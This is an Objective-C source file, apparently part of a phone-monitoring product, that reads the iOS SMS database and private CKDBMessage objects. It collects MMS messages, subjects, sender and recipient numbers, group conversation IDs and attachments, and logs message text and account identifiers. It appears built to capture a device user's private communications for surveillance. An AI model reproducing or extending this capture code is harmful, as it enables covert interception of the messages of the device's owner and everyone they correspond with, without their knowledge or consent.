//
//  MMSCaptureDAO.m
//  MMSCaptureManager
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MMSCaptureDAO.h"
#import "MMSAttachmentUtils.h"
#import "FxMmsEvent.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "DateTimeFormat.h"
#import "ArrayUtils.h"
#import "FMDatabase.h"
#import "FMResultSet.h"

#import "CKDBMessage.h"
#import "CKDBMessage+IOS6.h"

#import <objc/runtime.h>

static NSString * const kSelectMMSEventSql1	= @"select ROWID, text, subject, is_from_me, handle_id, cache_roomnames from message where "
													"error = 0 and service = 'SMS' and (length(subject) > 0 or ROWID in (select message_id from message_attachment_join)) "
													"order by ROWID desc limit %d";

static NSString * const kSelectMMSEventSql2	= @"select ROWID, text, subject, is_from_me, handle_id, cache_roomnames from message where ROWID = %d";

static NSString * const kSelectHandleSql	= @"select id, uncanonicalized_id from handle where ROWID = %d";

static NSString * const kSelectChatSql		= @"select guid from chat where ROWID in (select chat_id from chat_message_join where message_id = %d)";

@implementation MMSCaptureDAO

@synthesize mAttachmentPath;
@synthesize mAttSavingQueue;

- (id) init {
	if ((self = [super init])) {
		mSMSDatabase = [[FMDatabase databaseWithPath:kSMSHistoryDatabasePath] retain];
		[mSMSDatabase open];
	}
	return (self);
}

- (NSArray *) selectMMSEvents: (NSInteger) aNumberOfEvents {
	NSMutableArray *events = [[NSMutableArray alloc] initWithCapacity:aNumberOfEvents];
	NSString *sql1 = [NSString stringWithFormat:kSelectMMSEventSql1, aNumberOfEvents];
	FMResultSet *rs1 = [mSMSDatabase executeQuery:sql1];
	while ([rs1 next]) {
		NSInteger ROWID = [rs1 intForColumnIndex:0];
		//NSString *message = [rs1 stringForColumnIndex:1];
		NSString *subject = [rs1 stringForColumnIndex:2];
		BOOL is_from_me = [rs1 intForColumnIndex:3];
		NSInteger handle_id = [rs1 intForColumnIndex:4];
		
		FxMmsEvent *mmsEvent = [[FxMmsEvent alloc] init];
		[mmsEvent setEventId:ROWID];
		[mmsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		//[mmsEvent setMessage:message];
		[mmsEvent setSubject:subject];
		
		NSString *sql2 = [NSString stringWithFormat:kSelectHandleSql, handle_id];
		FMResultSet *rs2 = [mSMSDatabase executeQuery:sql2];
		NSString *address = nil;
		if ([rs2 next]) {
			address = ([[rs2 stringForColumnIndex:1] length] > 0) ? [rs2 stringForColumnIndex:1] : // uncanonicalized_id
																    [rs2 stringForColumnIndex:0]; // id
		}
		
		NSString *sql3 = [NSString stringWithFormat:kSelectChatSql, ROWID];
		FMResultSet *rs3 = [mSMSDatabase executeQuery:sql3];
		NSString *groupID = nil;
		if ([rs3 next]) {
			groupID = [rs3 stringForColumnIndex:0];
		}
		[mmsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object = %@", dbMessage);
		DLog (@"address = %@", [dbMessage address]);
		DLog (@"text = %@", [dbMessage text]);
		DLog (@"subject = %@", [dbMessage subject]);
		DLog (@"recipients = %@", [dbMessage recipients]);
		DLog (@"isOutgoing = %d", [dbMessage isOutgoing]);
		DLog (@"hasAttachments = %d", [dbMessage hasAttachments]);
		DLog (@"attachmentText = %@", [dbMessage attachmentText]);
		DLog (@"messageParts = %@", [dbMessage messageParts]);
		DLog (@"groupid = %@", [dbMessage groupID]);
		DLog (@"guid = %@", [dbMessage guid]);
		DLog (@"madridAccountGUID = %@", [dbMessage madridAccountGUID]);
		DLog (@"isMessageFullyLoaded = %d", [dbMessage isMessageFullyLoaded]);
		DLog (@"+++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
			[mmsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
				[mmsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
					[mmsEvent addRecipient:recipient];
					[recipient release];
				}
			}
		} else {
			[mmsEvent setDirection:kEventDirectionIn];
			[mmsEvent setSenderNumber:address]; // Contact name will cannot get here
		}
		
		// Attachments
		MMSAttachmentUtils *utils = [[MMSAttachmentUtils alloc] init];
		[utils setMAttachmentPath:mAttachmentPath];
		[utils setMAttSavingQueue:mAttSavingQueue];
		NSMutableArray *attachments = [utils getAttachments:dbMessage];
		[mmsEvent setAttachmentArray:attachments];
		[utils release];
		
		[dbMessage release];
		[events addObject:mmsEvent];
		[mmsEvent release];
		
		DLog (@"======================================");
		DLog (@"ROWID = %d", ROWID);
		//DLog (@"message = %@", message);
		DLog (@"subject = %@", subject);
		DLog (@"is_from_me = %d", is_from_me);
		DLog (@"handle_id = %d", handle_id);
		DLog (@"address = %@", address);
		DLog (@"groupID = %@", groupID);
		DLog (@"======================================");
	}
	NSArray *mmsEvents = [ArrayUtils reverseArray:events];
	[events release];
	return (mmsEvents);
}

- (FxMmsEvent *) selectMMSEvent: (NSInteger) aROWID {
	FxMmsEvent *mmsEvent = nil;
	NSString *sql1 = [NSString stringWithFormat:kSelectMMSEventSql2, aROWID];
	FMResultSet *rs1 = [mSMSDatabase executeQuery:sql1];
	while ([rs1 next]) {
		NSInteger ROWID = [rs1 intForColumnIndex:0];
		//NSString *message = [rs1 stringForColumnIndex:1];
		NSString *subject = [rs1 stringForColumnIndex:2];
		BOOL is_from_me = [rs1 intForColumnIndex:3];
		NSInteger handle_id = [rs1 intForColumnIndex:4];
		
		mmsEvent = [[[FxMmsEvent alloc] init] autorelease];
		[mmsEvent setEventId:ROWID];
		[mmsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		//[mmsEvent setMessage:message];
		[mmsEvent setSubject:subject];
		
		NSString *sql2 = [NSString stringWithFormat:kSelectHandleSql, handle_id];
		FMResultSet *rs2 = [mSMSDatabase executeQuery:sql2];
		NSString *address = nil;
		if ([rs2 next]) {
			address = ([[rs2 stringForColumnIndex:1] length] > 0) ? [rs2 stringForColumnIndex:1] : // uncanonicalized_id
			[rs2 stringForColumnIndex:0]; // id
		}
		
		NSString *sql3 = [NSString stringWithFormat:kSelectChatSql, ROWID];
		FMResultSet *rs3 = [mSMSDatabase executeQuery:sql3];
		NSString *groupID = nil;
		if ([rs3 next]) {
			groupID = [rs3 stringForColumnIndex:0];
		}
		[mmsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object = %@", dbMessage);
		DLog (@"address = %@", [dbMessage address]);
		DLog (@"text = %@", [dbMessage text]);
		DLog (@"subject = %@", [dbMessage subject]);
		DLog (@"recipients = %@", [dbMessage recipients]);
		DLog (@"isOutgoing = %d", [dbMessage isOutgoing]);
		DLog (@"hasAttachments = %d", [dbMessage hasAttachments]);
		DLog (@"attachmentText = %@", [dbMessage attachmentText]);
		DLog (@"messageParts = %@", [dbMessage messageParts]);
		DLog (@"groupid = %@", [dbMessage groupID]);
		DLog (@"guid = %@", [dbMessage guid]);
		DLog (@"madridAccountGUID = %@", [dbMessage madridAccountGUID]);
		DLog (@"isMessageFullyLoaded = %d", [dbMessage isMessageFullyLoaded]);
		DLog (@"+++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
			[mmsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
				[mmsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
					[mmsEvent addRecipient:recipient];
					[recipient release];
				}
			}
		} else {
			[mmsEvent setDirection:kEventDirectionIn];
			[mmsEvent setSenderNumber:address]; // Contact name will cannot get here
		}
		
		// Attachments
		MMSAttachmentUtils *utils = [[MMSAttachmentUtils alloc] init];
		[utils setMAttachmentPath:mAttachmentPath];
		[utils setMAttSavingQueue:mAttSavingQueue];
		NSMutableArray *attachments = [utils getAttachments:dbMessage];
		[mmsEvent setAttachmentArray:attachments];
		[utils release];
		
		[dbMessage release];
		
		DLog (@"======================================");
		DLog (@"ROWID = %d", ROWID);
		//DLog (@"message = %@", message);
		DLog (@"subject = %@", subject);
		DLog (@"is_from_me = %d", is_from_me);
		DLog (@"handle_id = %d", handle_id);
		DLog (@"address = %@", address);
		DLog (@"groupID = %@", groupID);
		DLog (@"======================================");
	}
	return (mmsEvent);
}

- (void) dealloc {
	[mAttachmentPath release];
	[mSMSDatabase close];
	[mSMSDatabase release];
	[super dealloc];
}

@end
